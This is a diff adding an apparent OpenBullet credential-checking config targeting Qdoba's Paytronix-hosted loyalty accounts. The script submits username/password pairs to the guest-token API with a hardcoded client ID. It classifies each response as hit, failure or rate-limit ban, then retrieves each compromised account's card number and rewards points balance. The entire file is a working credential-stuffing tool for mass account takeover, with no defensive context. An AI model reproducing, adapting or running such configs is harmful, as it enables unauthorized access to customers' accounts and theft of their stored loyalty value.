@@ -1,0 +1,80 @@
+[SETTINGS]
+{
+  "Name": "QDOBA",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-21T18:21:57.2672461-04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "i wanna die#0001",
+  "Version": "1.2.1",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.pxsweb.com/rest/14.15/oauth/requestGuestToken.json" 
+  CONTENT "{\"authentication\":\"anonymous\",\"grant_type\":\"http:\\/\\/paytronix.com\\/oauth\\/fieldset\",\"client_id\":\"Fzg2PJKpjmPtfzwPbx_W6amvkVeEeQjkMits8oAT\",\"merchantId\":\"632\",\"scope\":\"user_read user_write account_read account_write\",\"cardTemplateCode\":\"0\",\"fields\":{\"username\":\"<USER>\",\"password\":\"<PASS>\"}}" 
+  CONTENTTYPE "text/plain; charset=UTF-8" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 106" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Cookie: JSESSIONID=z8obEU7IbU6atIIJpPzvTt1C8iomrp5vx8mHOZmL.px-guest-web; __cfduid=de948de7c71f3b43633e62aeefa9382041584991839; __cf_bm=b7ae41c2509e6d494301b09315404a46c977bece-1587504078-1800-AcnGsI5REMljb+OJiv7p7uRghN+tJNAHVpoeVqEi7fim2bge0D7JVnbMMYz8W7H+L/qUUYQrBZK8CJynfLDULT8=; __cflb=02DiuGtRQV8XTZQGv37CHaJFNvyctjJp6dWx2ZoAHpFCQ; pxCookie=Y; Paytronix-WebUI-CSS-ONLY-Login-Merchant-ID=m_id=632" 
+  HEADER "Host: qdoba.myguestaccount.com" 
+  HEADER "Origin: https://qdoba.myguestaccount.com" 
+  HEADER "Referer: https://qdoba.myguestaccount.com/guest/accountlogin" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"access_token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "no_matching_guests" 
+    KEY "invalid_request" 
+  KEYCHAIN Ban OR 
+    KEY "rate_limited" 
+
+PARSE "<SOURCE>" LR "{\"access_token\":\"" "\"" -> VAR "TOKEN" 
+
+PARSE "<SOURCE>" LR "printedCardNumber\":\"" "\"" -> VAR "NUM" 
+
+REQUEST GET "https://api.pxsweb.com/rest/14.15/guest/accountInformation.json?merchantId=632&client_id=Fzg2PJKpjmPtfzwPbx_W6amvkVeEeQjkMits8oAT&access_token=<TOKEN>&authentication=oauth&printedCardNumber=<NUM>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "balance\":\"" "\"" Recursive=TRUE -> VAR "POINT5" 
+
+PARSE "<POINT5[2]>" LR "" "" CreateEmpty=FALSE -> CAP "POINTS" 
+
